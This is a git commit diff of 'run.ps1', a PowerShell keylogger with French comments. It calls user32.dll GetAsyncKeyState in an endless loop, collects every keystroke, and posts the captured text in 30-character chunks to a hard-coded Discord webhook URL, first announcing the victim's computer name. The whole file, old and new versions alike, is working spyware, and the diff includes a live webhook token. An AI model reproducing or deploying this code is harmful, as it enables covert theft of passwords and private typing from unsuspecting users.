0c72d3f3dc191f9d2e2d2660ba1ea4ec8c21827f
hamzza00 <hamzaouajoura@gmail.com>
2025-11-30 00:32:20 +0100

    Update run.ps1

--- run.ps1
+++ run.ps1
@@ -1,26 +1,27 @@
-$webhook = "https://discord.com/api/webhooks/1318280027363606589/FkAnJDBzgFUo3A7YeocKsc8PbojYTWuE0-_BTNn7SunjxTokeWNOVpHk_dN9Uh5XqrOW"
+$webhook = 'https://discord.com/api/webhooks/1318280027363606589/FkAnJDBzgFUo3A7YeocKsc8PbojYTWuE0-_BTNn7SunjxTokeWNOVpHk_dN9Uh5XqrOW'
 
-# Message de démarrage
-iwr $webhook -Method Post -Body (@{content="Keylogger PowerShell natif lance sur $env:COMPUTERNAME"} | ConvertTo-Json) -ContentType "application/json" -UseBasicParsing | Out-Null
+iwr $webhook -Method Post -Body (@{content="Keylogger PowerShell natif lancé – $env:COMPUTERNAME"} | ConvertTo-Json) -ContentType 'application/json' -UseBasicParsing | Out-Null
 
 $signature = @'
-[DllImport("user32.dll")] public static extern int GetAsyncKeyState(int vKey);
-[DllImport("user32.dll")] public static extern int GetForegroundWindow();
-[DllImport("user32.dll")] public static extern int GetWindowText(int hWnd, System.Text.StringBuilder text, int count);
+[DllImport("user32.dll")]
+public static extern int GetAsyncKeyState(int vKey);
+[DllImport("user32.dll")]
+public static extern int GetForegroundWindow();
+[DllImport("user32.dll")]
+public static extern int GetWindowText(int hWnd, System.Text.StringBuilder text, int count);
 '@
 
-Add-Type -MemberDefinition $signature -Namespace "Win32" -Name "NativeMethods" -ErrorAction SilentlyContinue
+Add-Type -MemberDefinition $signature -Name NativeMethods -Namespace Win32
 
-$buffer = ""
+$buffer = ''
 while ($true) {
-    Start-Sleep -Milliseconds 40
+    Start-Sleep -m 40
     for ($i = 8; $i -le 254; $i++) {
-        $key = [Win32.NativeMethods]::GetAsyncKeyState($i)
-        if ($key -eq -32767) {
+        if ([Win32.NativeMethods]::GetAsyncKeyState($i) -eq -32767) {
             $buffer += [char]$i
             if ($buffer.Length -ge 30) {
-                iwr $webhook -Method Post -Body (@{content=$buffer} | ConvertTo-Json) -ContentType "application/json" -UseBasicParsing | Out-Null
-                $buffer = ""
+                iwr $webhook -Method Post -Body (@{content=$buffer} | ConvertTo-Json) -ContentType 'application/json' -UseBasicParsing | Out-Null
+                $buffer = ''
             }
         }
     }
